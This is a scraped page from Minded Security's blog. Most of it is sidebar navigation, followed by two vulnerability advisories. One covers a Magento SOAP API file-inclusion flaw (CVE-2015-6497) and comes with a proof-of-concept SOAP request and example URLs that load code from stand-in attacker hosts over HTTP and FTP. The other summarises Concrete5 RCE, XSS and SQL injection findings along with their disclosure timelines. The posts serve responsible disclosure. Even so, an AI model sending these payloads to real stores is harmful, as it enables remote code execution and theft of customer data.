  )
* [Supply Chain Security](https://blog.mindedsecurity.com/search/label/Supply%20Chain%20Security)
  (
  1
  )
* [SVG](https://blog.mindedsecurity.com/search/label/SVG)
  (
  1
  )
* [Swift](https://blog.mindedsecurity.com/search/label/Swift)
  (
  1
  )
* [TARA](https://blog.mindedsecurity.com/search/label/TARA)
  (
  1
  )
* [Telerik UI](https://blog.mindedsecurity.com/search/label/Telerik%20UI)
  (
  1
  )
* [TESTABLE](https://blog.mindedsecurity.com/search/label/TESTABLE)
  (
  1
  )
* [testing](https://blog.mindedsecurity.com/search/label/testing)
  (
  1
  )
* [Threat Modeling](https://blog.mindedsecurity.com/search/label/Threat%20Modeling)
  (
  1
  )
* [twitter](https://blog.mindedsecurity.com/search/label/twitter)
  (
  1
  )
* [UNECE R155](https://blog.mindedsecurity.com/search/label/UNECE%20R155)
  (
  1
  )
* [unzip directory traversal](https://blog.mindedsecurity.com/search/label/unzip%20directory%20traversal)
  (
  1
  )
* [UPnP](https://blog.mindedsecurity.com/search/label/UPnP)
  (
  2
  )
* [validation](https://blog.mindedsecurity.com/search/label/validation)
  (
  1
  )
* [Vulnerabilities statistics](https://blog.mindedsecurity.com/search/label/Vulnerabilities%20statistics)
  (
  1
  )
* [WAF](https://blog.mindedsecurity.com/search/label/WAF)
  (
  1
  )
* [WAPT](https://blog.mindedsecurity.com/search/label/WAPT)
  (
  1
  )
* [Web Application Firewall](https://blog.mindedsecurity.com/search/label/Web%20Application%20Firewall)
  (
  1
  )
* [web architecture security](https://blog.mindedsecurity.com/search/label/web%20architecture%20security)
  (
  1
  )
* [Web Attacks](https://blog.mindedsecurity.com/search/label/Web%20Attacks)
  (
  23
  )
* [web cache](https://blog.mindedsecurity.com/search/label/web%20cache)
  (
  1
  )
* [web injection](https://blog.mindedsecurity.com/search/label/web%20injection)
  (
  4
  )
* [Web Security](https://blog.mindedsecurity.com/search/label/Web%20Security)
  (
  23
  )
* [Windows Phone Security](https://blog.mindedsecurity.com/search/label/Windows%20Phone%20Security)
  (
  1
  )
* [WWeb Security](https://blog.mindedsecurity.com/search/label/WWeb%20Security)
  (
  2
  )
* [zeus p2p](https://blog.mindedsecurity.com/search/label/zeus%20p2p)
  (
  3
  )

## Blog Archive

* [May](https://blog.mindedsecurity.com/2024/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2024/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2024/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2023/10/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2023/06/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2023/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2023/02/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2022/07/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2021/12/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2021/08/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2021/05/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2021/02/)
  (
  1
  )
* [January](https://blog.mindedsecurity.com/2021/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2020/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2020/10/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2020/07/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2020/06/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2020/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2020/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2020/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2020/02/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2019/04/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2018/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2018/09/)
  (
  3
  )
* [July](https://blog.mindedsecurity.com/2018/07/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2018/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2018/04/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2017/11/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2017/06/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2016/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2016/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2015/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2015/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2015/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2015/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2015/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2015/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2015/03/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2015/02/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2014/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2014/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2014/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2013/10/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2013/04/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2013/02/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2012/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2012/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2012/09/)
  (
  4
  )
* [June](https://blog.mindedsecurity.com/2012/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2011/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2011/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2011/08/)
  (
  2
  )
* [July](https://blog.mindedsecurity.com/2011/07/)
  (
  2
  )
* [May](https://blog.mindedsecurity.com/2011/05/)
  (
  2
  )
* [April](https://blog.mindedsecurity.com/2011/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2011/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2010/10/)
  (
  8
  )
* [September](https://blog.mindedsecurity.com/2010/09/)
  (
  3
  )
* [August](https://blog.mindedsecurity.com/2010/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2010/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2010/04/)
  (
  4
  )
* [March](https://blog.mindedsecurity.com/2010/03/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2009/12/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2009/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2009/10/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2009/05/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2009/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2009/01/)
  (
  1
  )

####

Minded Security was established in Italy in 2007

with a focus on supporting businesses and

organizations to build secure products
 and services.

##### Services

* Training
* Testing
* Consulting
* Request a brochure

##### Information

* The Company
* blueclosure
* AMT – Banking Malware Detector
* Contact us
* Privacy Policy

##### Newsletter

©2015 Minded Security S.r.l. The Software Security Company - VAT IT05756380480

[Back to top](#top)



=== Content from blog.mindedsecurity.com_a456cc10_20250126_020850.html ===


[Subscribe our newsletter](https://mindedsecurity.com/newsletter)

[Minded Security](https://mindedsecurity.com)

* Industry
  + [Automotive/Maritime](https://mindedsecurity.com/industry/automotive-maritime/ "Automotive/Maritime")
  + [Financial](https://mindedsecurity.com/industry/financial/ "Financial")
  + [GDO](https://mindedsecurity.com/industry/gdo/ "GDO")
  + [Industrial Control Systems](https://mindedsecurity.com/industry/industrial-control-systems/ "Industrial Control Systems")
  + [IoT Security](https://mindedsecurity.com/industry/iot-security/ "IoT Security")
  + [Healthcare](https://mindedsecurity.com/industry/healthcare/ "Healthcare")
  + [Government](https://mindedsecurity.com/industry/government/ "Government")
* [Services](https://mindedsecurity.com/our-services/ "Services")
  + [Training](https://mindedsecurity.com/our-services/training/ "Training")
    - [Security Hackaton](https://mindedsecurity.com/services/training/security-hackaton/ "Security Hackaton")
    - [Advanced On-site Training](https://mindedsecurity.com/services/training/advanced-on-site-training/ "Advanced On-site Training")
    - [BlueClosure Training](https://mindedsecurity.com/services/training/blueclosure-training/ "BlueClosure Training")
    - [High Level Training](https://mindedsecurity.com/services/training/high-level-training/ "High Level Training")
    - [Webinar](https://mindedsecurity.com/services/training/webinar/ "Webinar")
  + [Testing](https://mindedsecurity.com/our-services/testing/ "Testing")
    - [Manual Secure Code Review](https://mindedsecurity.com/services/testing/manual-secure-code-review/ "Manual Secure Code Review")
    - [Manual WAPT](https://mindedsecurity.com/services/testing/manual-wapt/ "Manual WAPT")
    - [Cloud Security Testing](https://mindedsecurity.com/services/testing/cloud-security-testing/ "Cloud Security Testing")
    - [IoT Security](https://mindedsecurity.com/services/testing/iot-security/ "IoT Security")
    - [API Security](https://mindedsecurity.com/services/testing/api-security/ "API Security")
    - [Mobile Security Assessment](https://mindedsecurity.com/services/testing/mobile-security-assessment/ "Mobile Security Assessment")
    - [Client Side Assessment](https://mindedsecurity.com/services/testing/client-side-assessment/ "Client Side Assessment")
  + [Consulting](https://mindedsecurity.com/our-services/consulting/ "Consulting")
    - [Software Security Advisory](https://mindedsecurity.com/services/consulting/software-security-advisory/ "Software Security Advisory")
    - [5D Framework](https://mindedsecurity.com/services/consulting/5d-framework/ "5D Framework")
    - [Threat Modeling](https://mindedsecurity.com/services/consulting/threat-modeling/ "Threat Modeling")
    - [Secure Design](https://mindedsecurity.com/services/consulting/secure-design/ "Secure Design")
    - [Secure Architecture Review](https://mindedsecurity.com/services/consulting/secure-architecture-review/ "Secure Architecture Review")
    - [Secure Coding Guidelines](https://mindedsecurity.com/services/consulting/secure-coding-guidelines/ "Secure Coding Guidelines")
    - [Fixing Support](https://mindedsecurity.com/services/consulting/fixing-support/ "Fixing Support")
    - [Outsourcing Development Governance](https://mindedsecurity.com/services/consulting/outsourcing-development-governance/ "Outsourcing Development Governance")
  + [Request a brochure](https://mindedsecurity.com/request-a-brochure/ "Request a brochure")
* Resources
  + [Blog](https://blog.mindedsecurity.com/ "Blog")
  + [News](https://mindedsecurity.com/category/news/ "News")
  + [Videos](https://mindedsecurity.com/videos/ "Videos")
  + [Research](https://mindedsecurity.com/research/ "Research")
  + [Advisories](https://mindedsecurity.com/research/advisories/ "Advisories")
* [About us](https://mindedsecurity.com/our-mission/ "About us")
  + [The Company](https://mindedsecurity.com/the-company/ "The Company")
  + [Contact us](https://mindedsecurity.com/contact-us/ "Contact us")
  + [Newsletter](https://mindedsecurity.com/newsletter/ "Newsletter")
  + [Jobs](https://mindedsecurity.com/jobs/ "Jobs")
  + [Privacy Policy](https://mindedsecurity.com/privacy-policy/ "Privacy Policy")

## IMQ Minded Security Blog

[skip to main](#main)  |
[skip to sidebar](#sidebar)

Showing posts with label **Advisory**. [Show all posts](https://blog.mindedsecurity.com/)

Showing posts with label **Advisory**. [Show all posts](https://blog.mindedsecurity.com/)

## Friday, September 11, 2015

# [Autoloaded File Inclusion in Magento SOAP API (SUPEE-6482)](https://blog.mindedsecurity.com/2015/09/autoloaded-file-inclusion-in-magento.html)

This past February we reported an interesting and quite overlooked kind of vulnerability in the [Magento](http://magento.com/) web e-commerce platform. The vulnerability might allow an authenticated attacker to execute arbitrary code on the affected web stores, and this can lead to a complete compromise, including credit card information and personal data theft. We received the first reply from the Magento Security Team on June 22, 2015, stating that our submission was not eligible for the bug bounty program, because it was found to be invalid and not actionable. The reason for the rejection was that there are too many requirements to exploit the vulnerability, first of all it requires that Magento is running on outdated PHP versions, because this kind of vulnerability has been fixed in the PHP core engine at the beginning of 2014. However, as we will see in this post, there are still many websites out there using such outdated PHP versions. That should be one of the reasons why the Magento Security Team replied us on June 25, 2015, stating the following:
> *We were able to confirm your issue. Even though it requires knowing API credentials, it should not be possible to execute such actions. The PHP versions that are additionally vulnerable, while old are still used in popular distributions like RHEL 7.1.* *We will schedule fixing this issue for our next product release given lower priority. We will inform you regarding possible awards associated with this report.*

On August 4, 2015, a bundle of patches ([SUPEE-6482](http://magento.com/security/patches/supee-6482)) has been released by the Magento team, that resolved several security-related issues, including the one we reported in February. The same day Magento released new versions (Community Edition 1.9.2.1 and Enterprise Edition 1.14.2.1) that include SUPEE-6482 along with other security patches. On August 13, 2015, we requested a new CVE identifier for this vulnerability, and MITRE has assigned the name [CVE-2015-6497](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2015-6497) for it.

### **What is an "Autoloaded File Inclusion" vulnerability?**

This kind of vulnerability might affect PHP applications which uses an "exploitable" autoloading mechanism. The "[Autoloading Classes](http://php.net/manual/en/language.oop5.autoload.php)" feature has been introduced in PHP 5.0 with the magic function *\_\_autoload()* which is automatically called when your code references a class or interface that hasn’t been loaded yet. So, instead of including every needed class by hand, is it possible to register a function that gets called as soon as the code try to instantiate an unknown class. This function gets passed the unknown class name and is responsible for including the right file that contains the class definition. As an aside, starting from PHP 5.1.2 autoload-functions are usually registered via [*spl\_autoload\_register()*](http://php.net/manual/en/function.spl-autoload-register.php), which provides a more flexible alternative for autoloading classes. For this reason, using *\_\_autoload()* is discouraged and may be deprecated in the future. Here’s an example of an extremely basic *\_\_autoload()* implementation, which attempts to load the classes MyClass1 and MyClass2 from the files MyClass1.php and MyClass2.php respectively (it's taken from the official PHP documentation page):

```
<?php

 function __autoload($class_name) {
    include $class_name . '.php';
 }

 $obj  = new MyClass1();
 $obj2 = new MyClass2();

?>
```

While this feature is extremely useful and powerful, it might introduce potential local/remote file inclusion vulnerabilities when user-controlled input is used as a class name. Indeed, if an attacker can control the class name variable passed to an autoloading function, she could try to play around with it in order to include an arbitrary file and execute PHP code remotely. There are multiple ways to trigger the autoloader, the most obvious is class instantiation using the ***new*** operator. In addition to that, there are some PHP functions which can be considered as *sensitive sinks* for this kind of vulnerability. Here is an incomplete list:

* [class\_exists()](http://php.net/manual/en/function.class-exists.php)
* [interface\_exists()](http://php.net/manual/en/function.interface-exists.php)
* [method\_exists()](http://php.net/manual/en/function.method-exists.php)
* [property\_exists()](http://php.net/manual/en/function.property-exists.php)
* [is\_subclass\_of()](http://php.net/manual/en/function.is-subclass-of.php)
* ...

So, when user-controlled input (*tainted data*) enters one of these *sensitive sinks* there's a chance for the application to be vulnerable to "Autoloaded File Inclusion". Let's see a trivial example of vulnerable scripts:

```
<?php

 /* File: autoload.php */

 function __autoload($class_name) {
    include $class_name . '.php';
 }

?>
```

```
<?php

 /* File: vuln.php */

 require('autoload.php');

 if(isset($_GET['class']) && class_exists($_GET['class'])) {
    $obj = new $_GET['class'];
 } else {
    die('No class found');
 }

 /* Some code... */

?>
```

In this example an attacker controls a class name via the GET parameter "class", which is first used with the *class\_exists()* function (triggering the autoloader in case it is an unknown class) and then to instantiate a new object. This means that the attacker can control the *$class\_name* variable passed to the autoloader, therefore it could be possible to include arbitrary files from both local or remote resources by invoking URLs like these:

> **http://example.com/vuln.php?class=http://attacker.com/shell**
>
> **http://example.com/vuln.php?class=../../../tmp/cache/attacker\_controlled/file**

In the first case the autoloader will try to include and execute the PHP code located at *http://attacker.com/shell.php*, resulting in a Remote File Inclusion (RFI); while in the second case the autoloader will try to include and execute the PHP code located into the file */tmp/cache/attacker\_controlled/file.php*, resulting in a Local File Inclusion (LFI). Furthermore, in cases like this where the attacker controls the classname's prefix, in addition to http:// other [PHP wrappers](http://php.net/manual/en/wrappers.php) might be abused in order to execute arbitrary PHP code.

But... wait a moment! According to the [official documentation](http://php.net/manual/en/language.oop5.basic.php) *"a valid class name starts with a letter or underscore, followed by any number of letters, numbers, or underscores".* That means an attacker cannot include arbitrary files via class names because it should not be possible to e.g. use path traversal sequences (../../) through them. But here comes the problem: there was a [bug](https://bugs.php.net/bug.php?id=62789) in the PHP core which allowed to invoke class autoloaders with invalid class names. This bug has been solved in [January 2014](http://www.php.net/ChangeLog-5.php#5.4.24) with the release of PHP versions 5.4.24 and 5.5.8.

### **How many vulnerable PHP installs are out there?**

Well, the bug which might enable this kind of vulnerability has been fixed by the PHP team at the beginning of 2014. But is this enough to say this kind of vulnerability should not pose any security concern? Maybe not... At the end of 2014 has been published a [blog post](http://blog.ircmaxell.com/2014/12/php-install-statistics.html) showing that 78% of all PHP installs were not secure, meaning they had at least one known security vulnerability. Antony Ferrara, the author of that post, used the statistics data from [W3Techs](http://w3techs.com/) in order to come to that conclusion. Let's try to do the same with regards to the PHP installs affected by the autoloading bug. In other words, let's check how many PHP websites are using PHP versions before 5.4.24 or 5.5.8.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3EM7BJaEsfNVf5ER6me7RRHTJv_OcYNGxTPNSy9eSz_sK4Q2k0BVlc5IHcUnCTR7s5uDsUtPLERaajRpFqJenNa_HItbVojHmAEMQH9Qk-4-Bfq7oyk3D3_0sM2LnGpQP3i-TxQBeteY/s400/php5.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3EM7BJaEsfNVf5ER6me7RRHTJv_OcYNGxTPNSy9eSz_sK4Q2k0BVlc5IHcUnCTR7s5uDsUtPLERaajRpFqJenNa_HItbVojHmAEMQH9Qk-4-Bfq7oyk3D3_0sM2LnGpQP3i-TxQBeteY/s1600/php5.png)

The above table has been retrieved from the [PHP version 5](http://w3techs.com/technologies/details/pl-php/5/all) usage statistics page from W3Techs, as of September 10, 2015. It shows that at least **54.2%** of websites using PHP are affected by the autoloading bug (38.5% is using PHP 5.3, 14.7% is using PHP 5.2 and 1% is using PHP 5.1). Next step is to see how many websites are using vulnerable PHP 5.4.x and 5.5.x versions. The usage statistics page for [subversions of PHP 5.4](http://w3techs.com/technologies/details/pl-php/5.4/all) show that **12.7%** of websites using PHP are running a version before 5.4.24, while the usage statistics page for [subversions of PHP 5.5](http://w3techs.com/technologies/details/pl-php/5.5/all) show that **3.5%** of websites using PHP are running a version before 5.5.8. Overall, this means that **70.4%** of websites using PHP are affected by the autoloading bug. Roughly speaking, considering that according to the official website Magento powers more than 240,000 online shops, this could mean that over 150,000 websites powered by Magento might be affected by [CVE-2015-6497](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2015-6497).

###

### **Technical description of the****vulnerability**

The vulnerability is caused by the *Mage\_Catalog\_Model\_Product\_Api\_V2::create()* method, which handles the "[catalogProductCreate](http://devdocs.magento.com/guides/m1x/api/soap/catalog/catalogProduct/catalog_product.create.html)" SOAP API call. The vulnerable code is located into the /app/code/core/Mage/Catalog/Model/Product/Api/V2.php script:

```
    public function create($type, $set, $sku, $productData, $store = null)
    {
        if (!$type || !$set || !$sku) {
            $this->_fault('data_invalid');
        }

        $this->_checkProductTypeExists($type);
        $this->_checkProductAttributeSet($set);

        /** @var $product Mage_Catalog_Model_Product */
        $product = Mage::getModel('catalog/product');
        $product->setStoreId($this->_getStoreId($store))
            ->setAttributeSetId($set)
            ->setTypeId($type)
            ->setSku($sku);

        if (!property_exists($productData, 'stock_data')) {
            //Set default stock_data if not exist in product data
            $_stockData = array('use_config_manage_stock' => 0);
            $product->setStockData($_stockData);
        }

```

This method expects the $productData parameter to be an array (in form of a stdClass object) and uses the *property\_exists()* function with it. However, an attacker can manipulate a SOAP request arbitrarily and send the $productData parameter in form of a string. In this case, if the string passed to the *property\_exists()* function is an unknown class, any registered autloader function will be triggered. When the *property\_exists()* function is called there's only one autoloader function registered, that is the *Varien\_Autoload::autoload()* method:

```
    public function autoload($class)
    {
        if ($this->_collectClasses) {
            $this->_arrLoadedClasses[self::$_scope][] = $class;
        }
        if ($this->_isIncludePathDefined) {
            $classFile =  COMPILER_INCLUDE_PATH . DIRECTORY_SEPARATOR . $class;
        } else {
            $classFile = str_replace(' ', DIRECTORY_SEPARATOR, ucwords(str_replace('_', ' ', $class)));
        }
        $classFile.= '.php';
        //echo $classFile;die();
        return include $classFile;
    }

```

In such a scenario, the $class parameter automatically passed to this method is exactly the same string value sent through the $productData parameter from the SOAP request, which after some replacementes and a ".php" string appended to it, is being used in a call to the *[include()](http://php.net/manual/it/function.include.php)* function. This may result in an arbitrary file inclusion (both from local or remote resources) and could be exploited to include and execute arbitrary PHP code. There are some conditions which should be met in order to exploit this vulnerability:

* an API user account with privileges to create a catalog product is required;
* in order to include arbitrary files from remote locations, Magento should run on PHP before
  5.4.24 or 5.5.8, because such versions have fixed the issue related to invalid class names
  in the autoloading process;
* in order to include arbitrary files from remote locations the "allow\_url\_include" directive
  must be set to On;
* in case the allow\_url\_include directive is set to Off it might still be possible to include
  files from remote locations using the ssh2.sftp:// wrapper (which requires the SSH2 extension
  to be installed) or execute arbitrary OS commands leveraging the expect:// wrapper (which
  requires the Expect extension to be installed).

NOTE: if Magento is running on PHP version after 5.4.23 or 5.5.7 the vulnerability
could still be exploited by including a local file with a .php extension (something like /tmp/test.php).
If Magento is running on PHP before 5.3.4 the vulnerability could be exploited to include arbitrary
local files with any extension (e.g. a session file containing malicious PHP code injected by the
attacker) because NULL bytes are allowed within the path (see [CVE-2006-7243](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2006-7243)).

### **Proof of Concept**

Once logged in with valid API credentials, an attacker could send a SOAP request like the following in order to try to exploit the vulnerability:
> POST /magento/index.php/api/v2\_soap HTTP/1.0
>
> Host: localhost
>
> Content-Length: 804
>
> Connection: close
>
>
>
> <?xml version="1.0" encoding="UTF-8"?>
>
> <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="urn:Magento" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
>
> <SOAP-ENV:Body>
>
> <ns1:catalogProductCreate>
>
> <sessionId xsi:type="xsd:string">VALID\_SESSION</sessionId>
>
> <type xsi:type="xsd:string">simple</type>
>
> <set xsi:type="xsd:string">4</set>
>
> <sku xsi:type="xsd:string">test</sku>
>
> <productData xsi:type="xsd:base64Binary">ZnRwOi8vYXR0YWNrZXI6cGFzc3dvcmRAYXR0YWNrZXJfc2VydmVyLmNvbS9ob21lL2F0dGFja2VyL2V2aWw=</productData>
>
> <storeView xsi:nil="true"/>
>
> </ns1:catalogProductCreate>
>
> </SOAP-ENV:Body>
>
> </SOAP-ENV:Envelope>

The  "productData" parameter has been encoded in base64 within the SOAP request, and the decoded string is the following:

> **ftp://attacker:password@attacker\_server.com/home/attacker/evil**

This means that leveraging the [ftp:// wrapper](http://php.net/manual/en/wrappers.ftp.php), an attacker might be able to force Magento to load and execute malicious code from a FTP server under its control. In this example, the attacker only has to put the malicious code under /home/attacker/evil.php. However, as we said before, other PHP wrappers might be abused, potentially leading to direct arbitrary PHP code execution.

By

[Egidio Romano](https://www.blogger.com/profile/14760841123995860416 "author profile")

at

[12:32 AM](https://blog.mindedsecurity.com/2015/09/autoloaded-file-inclusion-in-magento.html "permanent link")

[3 comments
:](https://blog.mindedsecurity.com/2015/09/autoloaded-file-inclusion-in-magento.html#comment-form)

[![](//img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7122745763234660283&postID=8106901234847721037&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=email "Email This")
[BlogThis!](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=blog "BlogThis!")
[Share to X](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=twitter "Share to X")
[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=facebook "Share to Facebook")
[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=pinterest "Share to Pinterest")

Labels:
[Advisory](https://blog.mindedsecurity.com/search/label/Advisory)
,
[Autoloaded File Inclusion](https://blog.mindedsecurity.com/search/label/Autoloaded%20File%20Inclusion)
,
[CVE-2015-6497](https://blog.mindedsecurity.com/search/label/CVE-2015-6497)
,
[Magento](https://blog.mindedsecurity.com/search/label/Magento)
,
[Remote Code Execution](https://blog.mindedsecurity.com/search/label/Remote%20Code%20Execution)

## Friday, June 12, 2015

# [Multiple security issues discovered in Concrete5 - Part 1](https://blog.mindedsecurity.com/2015/06/multiple-security-issues-discovered-in-concrete5-part1.html)

About a month ago we performed a Secure Code Review of **Concrete5 version [5.7.3.1](https://github.com/concrete5/concrete5/releases/tag/5.7.3.1)**, the latest stable release at that time, and discovered multiple security issues within it. In particular we found the following vulnerabilities:

* **A Remote Code Execution**
* **Multiple Reflected Cross Site Scripting**
* **A SQL Injection**
* ...others not fixed yet

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhiJ6myg7yk-aEBl7F2nV0ItF7CiVP78tt-oJrINR2RsYcwrkWWtkjbGH_Y7taBT6niMUP43kPpWthOhoK-p_vV_EWGMKfZ5EM5sC6BEWL6jgJsunOFkJr7IC7HwWGkxge8KV-TqbX2FLo/s400/logo_largo.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhiJ6myg7yk-aEBl7F2nV0ItF7CiVP78tt-oJrINR2RsYcwrkWWtkjbGH_Y7taBT6niMUP43kPpWthOhoK-p_vV_EWGMKfZ5EM5sC6BEWL6jgJsunOFkJr7IC7HwWGkxge8KV-TqbX2FLo/s1600/logo_largo.jpg)

These issues have been reported to the Concrete5 team through [HackerOne](https://hackerone.com/concrete5), since they have a bug bounty program in place. Some of them were promptly fixed in the next releases of the software, while others still have to be solved.
This is the reason why this post will be in two parts: in this first part we are going to cover the issues already fixed and publicly disclosed on the HackerOne website, while the remainings will be illustrated in the second part.

### Concrete5 CMS

[Concrete5](http://www.concrete5.org/) is one of the most used open source Content Management System (CMS) on the web. A recent infographic published by [CodeGuard](http://blog.codeguard.com/codeguard-state-of-the-web-report/) places Concrete5 as one of the most popular CMS after WordPress, Joomla and Drupal:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEia6g-hYXOJPMEIlCDoVbjlklyLyzFyLMnTyysm5qXfSLXa7wh4iqBsgHQlVOJPYteLiQjZMAZ-M5369Yc4xDcxkarqxp2LssSIhDG_gdyh9zX3GpjL5_tPLhJVq59YB4iKagIy4dPFw_E/s400/info.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEia6g-hYXOJPMEIlCDoVbjlklyLyzFyLMnTyysm5qXfSLXa7wh4iqBsgHQlVOJPYteLiQjZMAZ-M5369Yc4xDcxkarqxp2LssSIhDG_gdyh9zX3GpjL5_tPLhJVq59YB4iKagIy4dPFw_E/s1600/info.png)

Concrete5, a CMS written in PHP, was launched in 2003 as Concrete CMS. It was rebranded as Concrete5 and launched fully open source under the MIT license in 2008. According to the official website, Concrete5 powers more than 580,000 sites and has a community with over 230,000 members.

### The Issues

#### **Sendmail Remote Code Execution Vulnerability**

****Official Advisory**:**

<https://www.mindedsecurity.com/index.php/research/advisories/msa110615-1>

**Risk**: High
**Cause**: Lack of input validation
**Impact**: Arbitrary PHP Code Execution on the server

One of the most critical issues we discovered is a **Remote Code Execution (RCE)** vulnerability affecting Concrete5 websites which use *sendmail* as mail server. This vulnerability is due to an incorrect validation of an input parameter used to store a setting related to the sender's address of a registration notification email.

The attack can be carried out in two steps:

1. The sender's email address setting is modified to alter the *sendmail* command line in order to add specific parameters which allow to log all the email traffic into an arbitrary file;
2. The attacker will send a specially crafted request to register a new account and will put some malicious PHP code after its email address. This will be written into the log file chosen during the first step, so in case it's a .php file arbitrary PHP code execution may be achieved (using the same technique described [here](http://esec-pentest.sogeti.com/post/Using-mail%28%29-for-Remote-Code-Execution)).

Even though the sender's address parameter can be modified by administrator users only, an attacker might be able to exploit the bug leveraging a Cross-Site Request Forgery (CSRF) vulnerability affecting the related setting feature.
A detailed description of the vulnerability and a sample attack workflow are described in the following PDF:

**- Disclosure Timeline:**
[05/05/2015] - Vulnerability details sent through HackerOne

[05/05/2015] - Vendor said a patch has been committed and will be available in the next version

[05/07/2015] - Version [5.7.4](http://www.concrete5.org/documentation/developers/5.7/background/version-history/5-7-4-release-notes/) released along with the patch for this vulnerability

[06/06/2015] - Vulnerability publicly disclosed on [HackerOne](https://hackerone.com/reports/59663)

#### **Multiple Reflected Cross Site Scripting Vulnerabilities**

****Official Advisory**:**

<https://www.mindedsecurity.com/index.php/research/advisories/msa110615-2>

**Risk**: Medium
**Cause**: Lack of input validation
**Impact**: Unauthorized access to the victim's browser data

During our code review activity we found out that several input parameters are used to generate some HTML output without a proper encoding. This can be exploited to carry out **Reflected Cross Site Scripting (XSS)** attacks.
The following PDF describes the discovered XSS vulnerabilities and provides Proof of Concept (PoC) web pages for them:

**- Disclosure Timeline:**
[05/05/2015] - Vulnerabilities details sent through HackerOne

[05/05/2015] - Vendor said that 2 out of 6 reported vulnerabilities were already fixed in development

[05/07/2015] - Version [5.7.4](http://www.concrete5.org/documentation/developers/5.7/background/version-history/5-7-4-release-notes/) released along with patches for all the 6 vulnerabilities

[06/06/2015] - Vulnerabilities publicly disclosed on [HackerOne](https://hackerone.com/reports/59661)

#### **SQL Injection Vulnerability**

****Official Advisory**:**

<https://www.mindedsecurity.com/index.php/research/advisories/msa110615-3>

**Risk**: Medium
**Cause**: Lack of input validation
**Impact**: Unauthorized access to the data stored into the database

